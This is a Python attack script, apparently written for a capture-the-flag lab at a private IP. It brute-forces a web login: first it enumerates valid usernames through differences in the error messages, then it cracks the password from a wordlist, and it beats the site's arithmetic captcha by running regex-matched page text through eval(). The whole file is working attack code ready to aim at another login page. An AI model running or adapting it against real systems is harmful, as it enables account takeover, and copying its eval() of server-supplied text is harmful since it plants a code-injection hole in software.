import requests
from tqdm import tqdm
import re
from time import time

url = "http://10.10.113.34/login"
session = requests.session()

payload = {
    'username':'admin',
    'password':'admin'
    } 

start_time = 0
end_time = 0

def solve_captcha(response):
    try:
        captcha_pattern = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')
        find_captcha = captcha_pattern.findall(response)
        return eval(' '.join(find_captcha))
        # captcha_pattern = re.compile(r'(\d+)\s*([\+\*\-/])\s*(\d+)')
        # find_captcha = re.search(captcha_pattern,response)
        # num1, operator, num2 = int(find_captcha.group(1)),find_captcha.group(2),int(find_captcha.group(3))
        # if operator == '+':
        #     return num1 + num2
        # elif operator == '-':
        #     return num1 - num2
        # elif operator == '*':
        #     return num1 * num2
        # elif operator == '/':
        #     return num1 / num2
        # else:
        #     return f'Invalid operation {operator}'
    except Exception as e:
        raise Exception(f"\rCaptcha error: {e}")

def brute_force_username():
    try:
        usernames = open('usernames.txt','r').read().splitlines()
        print(f'Username brute force started')
        for index,username in enumerate(tqdm(usernames,smoothing=True,colour='green')):
            print(f'\r[{round((index/len(usernames))*100,2)}%] {username}',end='')
            payload['username'] = username
            response = session.post(url=url,data=payload)
            if 'Captcha enabled' in response.text:
                captcha = solve_captcha(response.text)
                payload['captcha'] = captcha
            response = session.post(url=url,data=payload)
            if 'Error' in response.text and 'Invalid password for user' in response.text:
                captcha = solve_captcha(response.text)
                payload['captcha'] = captcha
                return (True,username)
        return (False,str(''))
    except Exception as e:
        raise Exception(e)
    
def brute_force_password():
    try:
        passwords = open('passwords.txt','r').read().splitlines()
        print(f'Password brute brute force agains {payload["username"]}')
        for index,password in enumerate(tqdm(passwords,smoothing=True,colour='green')):
            payload['password'] = password
            print(f'\r[{round((index/len(passwords))*100,2)}%] {password}',end='')
            response = session.post(url=url,data=payload)
            if 'Invalid password for user' not in response.text:
                return (True,password)
            captcha = solve_captcha(response.text)
            payload['captcha'] = captcha
        return (False,str(''))
    except Exception  as e:
        raise Exception(e)
    
      
def main():
    try:
        start_time = time()
        find_user = brute_force_username()
        if find_user[0]:
            print(f'\rUser found \n username: {find_user[1]}')
            end_time = time()
            find_password = brute_force_password()
            if find_password[0]:
                print(f'\rUser found : \n username: {payload["username"]} \n password: {find_password[1]} \n duration {end_time - start_time} secs')
                exit(code=200)
            else:
                print(f'\rPassword not found for {payload["username"]} \n duration {end_time - start_time} secs')
                exit(code=404)
        else:
            end_time = time()
            print(f'\rUsername not found \n duration {end_time - start_time} secs')
            
    except Exception as e:
        print(e)
    
if __name__ == '__main__':
    main()